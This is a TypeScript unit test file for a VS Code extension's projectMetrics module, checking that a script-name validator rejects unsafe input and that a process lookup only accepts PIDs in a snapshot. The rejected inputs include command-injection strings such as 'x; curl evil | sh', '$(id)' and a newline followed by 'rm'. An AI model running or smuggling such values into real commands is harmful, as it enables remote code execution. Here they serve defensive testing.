import * as assert from 'assert';
import { containsPid, isSafeScriptName, ProjectSnapshot } from '../../projectMetrics';

suite('projectMetrics', () => {
    test('isSafeScriptName allows plain script names only', () => {
        for (const ok of ['build', 'test:unit', 'lint-fix', '@scope/x', 'vscode:prepublish']) {
            assert.ok(isSafeScriptName(ok), ok);
        }
        for (const bad of ['x; curl evil | sh', 'a && b', '$(id)', '`id`', 'a b', '--inspect', 'x\nrm']) {
            assert.ok(!isSafeScriptName(bad), bad);
        }
    });

    test('containsPid only accepts processes in the snapshot', () => {
        const node = (pid: number, children: any[] = []) => ({ pid, children } as any);
        const snap = { roots: [node(100, [node(101)])] } as ProjectSnapshot;
        assert.ok(containsPid(snap, 101));
        assert.ok(!containsPid(snap, 102));
        assert.ok(!containsPid(snap, 0));
        assert.ok(!containsPid(snap, -1));
        assert.ok(!containsPid(snap, NaN));
        assert.ok(!containsPid(undefined, 100));
    });
});
